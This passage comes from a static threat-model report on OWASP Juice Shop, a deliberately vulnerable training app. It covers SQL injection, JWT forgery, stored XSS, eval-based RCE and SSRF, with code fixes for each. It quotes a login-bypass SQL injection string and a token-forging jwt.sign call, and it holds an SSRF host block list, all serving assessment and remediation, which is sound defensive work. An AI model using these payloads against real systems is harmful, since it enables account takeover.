| <a id="t-022"></a>T-022 | Supply Chain (Dependencies) | Tampering | `express-jwt@0.1.3` and `jsonwebtoken@0.4.0` are pinned to versions released circa 2014, significantly predating current security standards (no `alg` allowlist, no `iss`/`aud` validation, algorithm confusion vulnerabilities fixed in later versions). These intentionally outdated versions are a supply-chain risk for any deployment attempting to use Juice Shop as a base. | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Lockfile present; SBOM generated | [M-016](#m-016) |

### Prior Findings Not Addressed in This Assessment

The following findings from the team-provided known threats were not explicitly mapped to a threat ID in this register. They are covered by the assessment but without direct PT-ID cross-reference.

| ID | Title | Severity | Source | Status |
|----|-------|----------|--------|--------|
| PT-2025-001 | Hardcoded RSA private key enables JWT forgery | Critical | known-threats.yaml | open |
| PT-2025-002 | SQL injection in login and search endpoints | Critical | known-threats.yaml | open |
| PT-2025-003 | Stored XSS via feedback endpoint with Angular sanitizer bypass | High | known-threats.yaml | open |
| PT-2025-004 | JWT stored in localStorage accessible to XSS | High | known-threats.yaml | open |

> **Note:** PT-2025-001 corresponds to [T-001](#t-001)/[T-002](#t-002); PT-2025-002 to [T-003](#t-003)/[T-004](#t-004); PT-2025-003 to [T-006](#t-006); PT-2025-004 to [T-005](#t-005). PT-2025-007 (MD5 hashing, mitigated) is discussed in Section 11 Out of Scope.


---

## 9. Critical Findings

The following entries represent the highest-severity threats identified in this assessment. Each finding is backed by specific code evidence and has a corresponding mitigation entry in Section 10.

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-001](#t-001) — JWT Admin Forgery via Hardcoded RSA Private Key

**Scenario:** RSA private key hardcoded as string literal at `lib/insecurity.ts:23` and also served publicly at `GET /encryptionkeys/jwt.pem`. Attacker downloads key and uses it with `jwt.sign({role:'admin',...}, privateKey, {algorithm:'RS256'})` to forge an admin JWT accepted by `express-jwt@0.1.3`.

**Current state:** Private key embedded in source (`lib/insecurity.ts:23`) AND served as static file (`server.ts:277`). `express-jwt@0.1.3` validates signature but not `iss`, `aud`, or algorithm.

→ **Mitigation:** [M-001 — Remove hardcoded JWT private key and restrict key access](#m-001) · [M-002 — Remove public serving of /encryptionkeys](#m-002)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-003](#t-003) — SQL Injection in Login Route (Authentication Bypass)

**Scenario:** `routes/login.ts:34` constructs: `SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '...'`. Sending `email: "' OR '1'='1'--"` authenticates as the first database user (admin) without any credentials.

**Current state:** Raw `sequelize.query()` with template literal interpolation. No input validation, no parameterization, no allowlist.

→ **Mitigation:** [M-003 — Parameterize all SQL queries](#m-003)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-004](#t-004) — SQL Injection in Search Route (Database Dump)

**Scenario:** `routes/search.ts:23` uses `req.query.q` in raw SQL. Unauthenticated attacker uses UNION injection to dump the entire `Users` table including MD5 password hashes, TOTP secrets, and email addresses.

**Current state:** Raw `sequelize.query()` with template literal interpolation on unauthenticated route. No authentication required to exploit.

→ **Mitigation:** [M-003 — Parameterize all SQL queries](#m-003)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-005](#t-005) — JWT Token Exfiltration via localStorage

**Scenario:** JWT stored in `localStorage` (`request.interceptor.ts:13`) is accessible to any JavaScript on the same origin. The stored XSS ([T-006](#t-006)) allows an attacker to inject a script that calls `localStorage.getItem('token')` and sends the value to an external server, giving the attacker a 6-hour session.

**Current state:** `localStorage.setItem('token', jwt)` — no `HttpOnly` flag possible in localStorage; no BFF or server-side session management.

→ **Mitigation:** [M-004 — Move JWT from localStorage to HttpOnly cookie or BFF session](#m-004)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-002](#t-002) — JWT Private Key Served at Public HTTP Endpoint

**Scenario:** `GET /encryptionkeys/jwt.pem` served by `server.ts:277` with no authentication. HTTP client downloads `jwt.pem`, uses it to forge admin token ([T-001](#t-001)). Also at `server.ts:278` all key files are individually accessible.

**Current state:** `app.use('/encryptionkeys', serveIndexMiddleware, serveIndex(...))` — no middleware before this line restricts access.

→ **Mitigation:** [M-002 — Remove public serving of /encryptionkeys](#m-002)

---

### <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> [T-006](#t-006) — Stored XSS via Feedback Endpoint

**Scenario:** `POST /api/Feedbacks` stores user-submitted HTML comments. `about.component.ts:119` renders them with `sanitizer.bypassSecurityTrustHtml()`, executing arbitrary JavaScript for all viewers including admins. Combined with [T-005](#t-005), this enables complete account takeover.

**Current state:** `bypassSecurityTrustHtml()` explicitly defeats Angular's built-in sanitizer. No CSP header to block inline script execution.

→ **Mitigation:** [M-005 — Remove bypassSecurityTrustHtml and add CSP](#m-005)

---

### <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> [T-009](#t-009) — Remote Code Execution via B2B Order eval()

**Scenario:** Authenticated attacker sends `POST /rest/b2bOrder` with crafted `orderLinesData` body. `routes/b2bOrder.ts:23` executes `vm.runInContext('safeEval(orderLinesData)', sandbox)`. The `notevil` sandbox is documented as bypassable, allowing full Node.js code execution.

**Current state:** `notevil` sandbox provides weak isolation. Requires authentication to reach endpoint.

→ **Mitigation:** [M-008 — Remove eval/vm.runInContext from B2B and profile routes](#m-008)

---

## 10. Mitigation Register

The following mitigations address the threats identified in Section 8. Each entry specifies the affected threats, implementation priority, estimated effort, and concrete code-level guidance.

### <a id="m-001"></a>M-001 · Remove Hardcoded JWT Private Key from Source Code

**Addresses:** [T-001](#t-001)
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** High

**Why:** The hardcoded RSA private key in source code allows anyone with repository access to forge admin-level JWTs, bypassing all authentication and authorization controls. The key is also in git history and cannot be truly removed without a key rotation.

**How:**
1. Generate a new RSA key pair outside the repository: `openssl genrsa -out jwt-private.pem 2048 && openssl rsa -in jwt-private.pem -pubout -out jwt-public.pem`
2. Store the private key in an environment variable or secrets manager (AWS Secrets Manager, HashiCorp Vault, Kubernetes Secret). Never commit to git.
3. Replace the hardcoded string in `lib/insecurity.ts:23` with: `const privateKey = process.env.JWT_PRIVATE_KEY ?? fs.readFileSync('encryptionkeys/jwt.pem', 'utf8')`
4. Rotate the key immediately — all existing tokens signed with the old key must be invalidated.
5. Upgrade `express-jwt` to 8.x and `jsonwebtoken` to 9.x for proper claim validation.
6. Add `iss`, `aud`, and algorithm allowlist validation:

```typescript
// Before (lib/insecurity.ts:23):
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwq...'

// After:
const privateKey = process.env.JWT_PRIVATE_KEY
  ?? fs.readFileSync(process.env.JWT_KEY_PATH ?? 'encryptionkeys/jwt.pem', 'utf8')

// Before (express-jwt usage):
export const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)

// After (with jsonwebtoken 9.x / express-jwt 8.x):
export const isAuthorized = () => expressJwt({
  secret: publicKey,
  algorithms: ['RS256'],
  issuer: 'juice-shop',
  audience: 'juice-shop-api'
})
```

**Reference:** [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) · CWE-321

---

### <a id="m-002"></a>M-002 · Remove Public Serving of Encryption Keys and Restrict Log Access

**Addresses:** [T-002](#t-002) · [T-014](#t-014)
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Low

**Why:** `/encryptionkeys` is publicly accessible and serves the JWT private key. `/support/logs` exposes HTTP access logs including tokens and PII. Both serve sensitive data with zero authentication.

**How:**
1. Remove or restrict the `/encryptionkeys` static route in `server.ts:276-278`:

```typescript
// Remove entirely:
// app.use('/encryptionkeys', serveIndexMiddleware, serveIndex('encryptionkeys', { icons: true }))
// app.use('/encryptionkeys/:file', serveKeyFiles())

// If a challenge requires the public key to be accessible, restrict to public key only:
app.get('/encryptionkeys/jwt.pub', (req, res) => {
  res.sendFile(path.resolve('encryptionkeys/jwt.pub'))
})
// Never serve jwt.pem
```

2. Add authentication to `/support/logs`:

```typescript
// Before (server.ts:281-283):
app.use('/support/logs', serveIndexMiddleware, serveIndex('logs', ...))
app.use('/support/logs/:file', serveLogFiles())

// After:
app.use('/support/logs', security.isAuthorized(), security.isAdmin(), serveIndexMiddleware, serveIndex('logs', ...))
app.use('/support/logs/:file', security.isAuthorized(), security.isAdmin(), serveLogFiles())
```

**Reference:** CWE-538 (File and Directory Information Exposure) · CWE-200

---

### <a id="m-003"></a>M-003 · Parameterize All SQL Queries (Login and Search Routes)

**Addresses:** [T-003](#t-003) · [T-004](#t-004)
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Medium

**Why:** Direct string interpolation in SQL allows authentication bypass and complete database extraction. These are the two most exploited routes in the application.

**How:**
1. Replace `routes/login.ts:34` raw query with Sequelize model method:

```typescript
// Before (routes/login.ts:34):
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)

// After:
UserModel.findOne({
  where: {
    email: req.body.email,
    password: security.hash(req.body.password ?? ''),
    deletedAt: null
  }
})
```

2. Replace `routes/search.ts:23` with Sequelize `Op.like` and bound parameters:

```typescript
// Before (routes/search.ts:23):
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'...`)

// After:
ProductModel.findAll({
  where: {
    [Op.or]: [
      { name: { [Op.like]: `%${criteria}%` } },
      { description: { [Op.like]: `%${criteria}%` } }
    ]
  }
})
```

**Reference:** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) · CWE-89

---

### <a id="m-004"></a>M-004 · Move JWT from localStorage to HttpOnly Cookie or BFF Session

**Addresses:** [T-005](#t-005)
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** High

**Why:** JWT in `localStorage` is accessible to any JavaScript on the same origin, making XSS attacks immediately result in token theft and full account takeover.

**How:**
1. Set the JWT as an `HttpOnly; Secure; SameSite=Strict` cookie on the server response instead of returning it in the JSON body:

```typescript
// Before (routes/login.ts - afterLogin):
res.json({ authentication: { token, bid: basket.id, umail: user.data.email } })

// After:
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 6 * 60 * 60 * 1000 // 6 hours
})
res.json({ authentication: { bid: basket.id, umail: user.data.email } })
// Do not return the token in the JSON body
```

2. Remove `localStorage.setItem('token', ...)` from all Angular components and services.
3. Configure `express-jwt` to read the token from the cookie instead of the `Authorization` header.

**Reference:** [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) · CWE-922

---

### <a id="m-005"></a>M-005 · Remove bypassSecurityTrustHtml and Add Content Security Policy

**Addresses:** [T-006](#t-006)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Medium

**Why:** `bypassSecurityTrustHtml()` explicitly disables Angular's XSS sanitizer, converting stored user content into an immediate stored XSS vulnerability. Without CSP, exploited XSS can exfiltrate tokens and perform CSRF attacks.

**How:**
1. Remove `bypassSecurityTrustHtml()` in `about.component.ts:119` and `administration.component.ts`. Use Angular's safe binding:

```typescript
// Before (about.component.ts:119):
feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)

// After: strip HTML on the server side before storing, then bind safely:
feedbacks[i].comment = feedback.comment // Let Angular's default sanitizer handle it
// OR use sanitize-html on the Express side before persisting feedback
```

2. Enable Helmet CSP in `server.ts`:

```typescript
// Before (server.ts:187 — commented out):
// app.use(helmet.xssFilter());

// After:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"], // narrow over time
    imgSrc: ["'self'", 'data:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}))
```

**Reference:** [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · CWE-79

---

### <a id="m-006"></a>M-006 · Add PKCE and state Parameter Validation to OAuth Flow

**Addresses:** [T-007](#t-007)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Medium

**Why:** Missing `state` parameter validation allows CSRF attacks on the OAuth callback, enabling account linking attacks. Missing PKCE leaves the authorization code vulnerable to interception.

**How:**
1. Generate a cryptographically random `state` value before initiating OAuth and store it in the server-side session.
2. In the callback handler, verify the returned `state` matches the stored value before exchanging the code.
3. Implement PKCE: generate `code_verifier`, compute `code_challenge = base64url(sha256(code_verifier))`, include in authorization request, send `code_verifier` in token exchange.

```typescript
// routes/oauth2/googleCallback:
app.get('/rest/oauth2/googleCallback', (req, res) => {
  const storedState = req.session.oauthState
  if (!req.query.state || req.query.state !== storedState) {
    return res.status(403).json({ error: 'Invalid state parameter' })
  }
  // proceed with code exchange
})
```

**Reference:** [OWASP OAuth 2.0 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html) · RFC 7636 (PKCE) · CWE-352

---

### <a id="m-007"></a>M-007 · Pass OAuth Access Token in Authorization Header, Not URL

**Addresses:** [T-008](#t-008)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**Why:** Access tokens in URLs leak into server logs, proxy logs, browser history, and Referer headers — including the publicly accessible `/support/logs`.

**How:**

```typescript
// Before (user.service.ts:68):
this.http.get(`https://www.googleapis.com/oauth2/v3/userinfo?access_token=${accessToken}`)

// After:
this.http.get('https://www.googleapis.com/oauth2/v3/userinfo', {
  headers: { Authorization: `Bearer ${accessToken}` }
})
```

**Reference:** [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) · RFC 6750 §5.3

---

### <a id="m-008"></a>M-008 · Remove eval() and vm.runInContext() from Production Routes

**Addresses:** [T-009](#t-009) · [T-010](#t-010)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Medium

**Why:** `eval()` and `vm.runInContext()` with user-controlled input are RCE vulnerabilities. No sandbox is reliably secure against determined attackers.

**How:**
1. In `routes/b2bOrder.ts:23`: Replace dynamic evaluation with a JSON schema validator for the order line data structure. Parse the order lines as JSON and validate against a strict schema instead of evaluating expressions.
2. In `routes/userProfile.ts:62`: Remove the `#{...}` pattern match and `eval()` call. If dynamic username formatting is needed, use a safe template engine that does not execute code (e.g. Handlebars with no helpers, or simple string replacement).

```typescript
// Before (routes/b2bOrder.ts:23):
const result = vm.runInContext('safeEval(orderLinesData)', sandbox)

// After:
const schema = { type: 'array', items: { type: 'object', properties: { productId: { type: 'number' }, quantity: { type: 'number' } }, required: ['productId', 'quantity'], additionalProperties: false } }
const valid = ajv.validate(schema, JSON.parse(req.body.orderLinesData))
if (!valid) throw new Error('Invalid order format')
```

**Reference:** CWE-94 (Code Injection) · [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

---

### <a id="m-009"></a>M-009 · Replace MD5 with bcrypt/Argon2 for Password Hashing

**Addresses:** [T-011](#t-011)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Medium

**Why:** MD5 is not a password hashing function. GPU-accelerated cracking tools can test billions of MD5 hashes per second. All current user passwords can be cracked within hours of a database breach.

**How:**

```typescript
// Before (lib/insecurity.ts:43):
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')

// After:
import bcrypt from 'bcrypt'
const BCRYPT_ROUNDS = 12
export const hashPassword = async (password: string): Promise<string> =>
  bcrypt.hash(password, BCRYPT_ROUNDS)
export const verifyPassword = async (password: string, hash: string): Promise<boolean> =>
  bcrypt.compare(password, hash)
```

- Update `models/user.ts:77` to call `await hashPassword(clearTextPassword)` in the setter hook.
- Update login query to fetch user by email only, then call `verifyPassword()` on the returned hash.

**Reference:** [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) · CWE-916

---

### <a id="m-010"></a>M-010 · Add URL Allowlist to Profile Image Upload (SSRF Prevention)

**Addresses:** [T-012](#t-012)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** Unrestricted server-side `fetch(userUrl)` enables SSRF attacks against internal services, cloud metadata endpoints, and localhost.

**How:**

```typescript
// Before (routes/profileImageUrlUpload.ts:24):
const response = await fetch(req.body.imageUrl)

// After:
const { hostname, protocol } = new URL(req.body.imageUrl)
const allowedProtocols = ['https:']
const blockedHosts = ['localhost', '127.0.0.1', '169.254.169.254', '::1']
if (!allowedProtocols.includes(protocol) || blockedHosts.includes(hostname)) {
  return res.status(400).json({ error: 'Invalid image URL' })
}
const response = await fetch(req.body.imageUrl)
```

**Reference:** [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) · CWE-918

---

### <a id="m-011"></a>M-011 · Disable External Entity Processing in libxmljs2

**Addresses:** [T-013](#t-013)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** XXE attacks can read arbitrary server-side files including `/encryptionkeys/jwt.pem`, enabling key theft without using the unauthenticated key endpoint.

**How:** Verify `libxmljs2.parseXml()` is called with `{ noent: false, noblanks: true }` options (or the equivalent) to disable external entity expansion. If the current call site in the file upload handler does not pass these options, add them.

```typescript
// Ensure XML is parsed safely:
const xmlDoc = libxmljs.parseXmlString(xmlContent, {
  noent: false,   // disable entity expansion
  nonet: true,    // disable network access
  recover: false
})
```

**Reference:** [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) · CWE-611

---

### <a id="m-012"></a>M-012 · Protect Admin Endpoints and Restrict Sensitive Routes

**Addresses:** [T-015](#t-015) · [T-016](#t-016)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** Unauthenticated admin configuration endpoints expose attack surface intelligence. Prometheus metrics and Swagger UI provide a complete map of the application to attackers.

**How:**
1. Add auth middleware to admin routes in `server.ts:604-605`:

```typescript
// Before:
app.get('/rest/admin/application-version', retrieveAppVersion())
app.get('/rest/admin/application-configuration', retrieveAppConfiguration())

// After:
app.get('/rest/admin/application-version', security.isAuthorized(), security.isAdmin(), retrieveAppVersion())
app.get('/rest/admin/application-configuration', security.isAuthorized(), security.isAdmin(), retrieveAppConfiguration())
```

2. Restrict `/metrics` to internal networks only via reverse proxy rules (nginx `allow 10.0.0.0/8; deny all`).
3. Restrict `/api-docs` to require authentication or disable in production.

**Reference:** CWE-284 (Improper Access Control) · [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)

---

### <a id="m-013"></a>M-013 · Add Rate Limiting to Login and WebSocket Endpoints

**Addresses:** [T-017](#t-017) · [T-021](#t-021)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**Why:** Unlimited login attempts enable brute-force attacks. Unlimited WebSocket connections enable denial of service.

**How:**

```typescript
// Add to server.ts (near existing rate limit at line 343):
import { rateLimit } from 'express-rate-limit'

const loginRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per window
  message: { error: 'Too many login attempts — please try again later' },
  standardHeaders: true,
  legacyHeaders: false
})

app.post('/rest/user/login', loginRateLimit, login())
```

For WebSocket: configure Socket.IO connection rate limits using the `allowRequest` option or a connection throttling library.

**Reference:** [OWASP Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) · CWE-307

---

### <a id="m-014"></a>M-014 · Enforce Resource Ownership Checks (IDOR Prevention)

**Addresses:** [T-018](#t-018)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Medium

**Why:** Sequential integer IDs for baskets and orders are predictable. Without ownership verification, any authenticated user can view and modify other users' orders.

**How:**

```typescript
// Add ownership check to basket routes:
app.get('/rest/basket/:id', security.isAuthorized(), async (req, res, next) => {
  const basket = await BasketModel.findByPk(req.params.id)
  if (!basket) return res.status(404).json({ error: 'Not found' })
  const currentUser = security.authenticatedUsers.from(req)
  if (basket.UserId !== currentUser?.data?.id) {
    return res.status(403).json({ error: 'Forbidden' })
  }
  res.json({ data: basket })
})
```

**Reference:** [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) · CWE-639

---

### <a id="m-015"></a>M-015 · Add Security Event Logging and Protect Log Files

**Addresses:** [T-019](#t-019) · [T-020](#t-020)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Medium

**Why:** Without security event logs, attacks are undetectable. Publicly accessible logs expose victim data and give attackers intelligence about their own detection status.

**How:**
1. Add structured security event logging using the existing winston logger:

```typescript
import logger from '../lib/logger'

// In routes/login.ts — after failed auth:
logger.warn({ event: 'AUTH_FAILURE', email: req.body.email, ip: req.ip, timestamp: new Date().toISOString() })

// In security.isAuthorized() — on JWT validation failure:
logger.warn({ event: 'AUTHZ_FAILURE', path: req.path, ip: req.ip, timestamp: new Date().toISOString() })
```

2. Never log the JWT value or password. Log the event type, user ID (not email in logs), IP, and path.
3. Forward logs to a centralized log aggregation system (SIEM) outside the application container.
4. Remove public access to `/support/logs` (covered in M-002).

**Reference:** [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) · CWE-778

---

### <a id="m-016"></a>M-016 · Upgrade express-jwt and jsonwebtoken to Current Versions

**Addresses:** [T-022](#t-022)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Medium

**Why:** `express-jwt@0.1.3` (~2014) and `jsonwebtoken@0.4.0` (~2014) predate critical security fixes: algorithm confusion attacks (CVE-2022-23529), none-algorithm bypass, and proper `iss`/`aud` claim validation.

**How:**
1. Update `package.json`: `"express-jwt": "^8.4.1"`, `"jsonwebtoken": "^9.0.2"`
2. Update usage to the current API (express-jwt 8.x changed the options object shape):

```typescript
// express-jwt 8.x:
import { expressjwt } from 'express-jwt'
export const isAuthorized = () => expressjwt({
  secret: publicKey,
  algorithms: ['RS256'],
  issuer: 'juice-shop',
  audience: 'juice-shop-api'
})
```

**Reference:** CWE-327 · [JWT Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## 11. Out of Scope

The following were not analyzed or were explicitly excluded from this assessment:

**De-scoped components (scope ceiling of 8 components applied; 9 identified):**
- `web3` / NFT / blockchain endpoints (`/rest/web3/*`) — Ethereum/Web3.js challenge endpoints not included; standard web3 security issues (replay attacks, gas manipulation) apply but are CTF challenges.
- `MarsDB` NoSQL store — in-process review-only database; threat surface covered within backend-api component analysis.

**Accepted risks (team-documented):**
- **P[T-202](#t-202)5-005** — Wildcard CORS policy (`app.use(cors())`): Accepted for CTF/training platform. No real user data deployed.
- **P[T-202](#t-202)5-006** — Unauthenticated `/metrics` and `/api-docs`: Accepted for training purposes. Production deployment would restrict via reverse proxy.

**Mitigated (team-documented, verify in code):**
- **P[T-202](#t-202)5-007** — MD5 password hashing: Partially mitigated in v18.0 for new accounts; legacy MD5 remains for CTF challenge accounts. This assessment confirms MD5 is still used for ALL accounts in `models/user.ts:77` — the mitigation appears incomplete.

**Not analyzed:**
- Transitive dependency vulnerabilities (SCA not enabled in this run; use `--with-sca` to include)
- Vagrant deployment configuration (`vagrant/`)
- Challenge verification logic in `routes/verify.ts` and `lib/challengeUtils.ts` (CTF-specific, not attack surface for real users)
- i18n translation files (non-functional security impact)
- Monitoring stack (`monitoring/` Prometheus/Grafana config) — no manifests committed

**Scope limitation:** This is a static analysis assessment. Dynamic runtime behavior, race conditions in challenge state management, and timing-based attacks require dynamic testing (OWASP ZAP is configured in CI for this purpose).
